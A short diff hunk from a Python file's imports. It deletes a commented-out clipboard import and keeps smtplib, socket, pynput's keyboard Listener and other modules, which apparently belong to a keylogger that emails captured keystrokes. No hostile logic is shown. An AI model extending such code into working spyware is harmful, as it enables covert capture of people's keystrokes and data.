@@ -7,7 +7,6 @@ import smtplib
 from time import sleep
 import socket
 import platform
-# import win32clipboard
 from pynput.keyboard import Key, Listener
 import time
 import os
